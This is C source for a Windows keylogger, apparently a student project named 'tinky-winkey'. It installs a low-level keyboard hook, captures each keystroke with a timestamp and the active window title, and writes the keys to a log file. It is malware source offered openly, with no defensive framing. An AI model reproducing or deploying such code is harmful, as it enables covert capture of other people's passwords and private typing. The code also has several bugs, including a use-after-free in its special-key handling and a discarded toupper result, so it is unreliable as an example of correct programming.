#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

HHOOK kbd_hook = NULL;
bool capsLock, shift;
FILE *f;
char title[256];
char timestamp[256];
HWND hwnd;
SYSTEMTIME st;

void    getKeysState(bool *capsLock, bool *shift) {
    *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
    *shift = GetAsyncKeyState(VK_SHIFT) & 0x0001;
}

void    handleSpecial(int vkCode, char *ratio) {
    if (ratio)
        free(ratio);
    if (vkCode == VK_SPACE)
        ratio = strdup("[SPACE]");
    else if (vkCode == VK_RETURN)
        ratio = strdup("[ENTER]");
    else if (vkCode == VK_BACK)
        ratio = strdup("[BACKSPACE]");
    else if (vkCode == VK_TAB)
        ratio = strdup("[TAB]");
    else if (vkCode == VK_ESCAPE)
        ratio = strdup("[ESC]");
    else if (vkCode == VK_CAPITAL)
        ratio = strdup("[CAPSLOCK]");
    else if (vkCode == VK_SHIFT)
        ratio = strdup("[SHIFT]");
    else if (vkCode == VK_CONTROL)
        ratio = strdup("[CTRL]");
}
LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
    if (code < 0)
        return CallNextHookEx(kbd_hook, code, wparam, lparam);

    // get the current system time and format it as a string

    KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;

    if (info->flags & LLKHF_UP)
        return 0;
    char keyboard_state[256];
    wchar_t buf[2];
    char *ratio;

    ratio = malloc(sizeof(char) * 4);
    if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
        getKeysState(&capsLock, &shift);
    GetKeyboardState(keyboard_state);
    int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
    if (buf_len > 0)
    {
        buf[buf_len] = 0;
        printf("VK_CONTROL: %d", VK_CONTROL);
        WideCharToMultiByte(CP_UTF8, 0, buf, -1, ratio, 4, NULL, NULL);
        if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_CONTROL)
            handleSpecial(info->vkCode, ratio);

        if (capsLock)
            toupper(ratio[0]);
        
        GetLocalTime(&st);
        sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        hwnd = GetForegroundWindow();
        GetWindowTextA(hwnd, title, 256);
        printf("[%s] %s > %s\n", timestamp, title, ratio);
        printf("Current window title: %s\n", title);
        fwrite(ratio, 1, strlen(ratio), f);
        fflush(f);
    }

    return 0;
}

int main(void) {
    HINSTANCE hInstance = GetModuleHandleW(NULL);

    f = fopen("C:\\Users\\Buste\\Documents\\GitHub\\tinky-winkey\\log.txt", "w");
    kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
    if (!kbd_hook)
    {
        printf("hook installation failed: %d\n", GetLastError());
        return (1);
    }

    MSG msg;
    getKeysState(&capsLock, &shift);
    GetMessageW(&msg, NULL, 0, 0);
}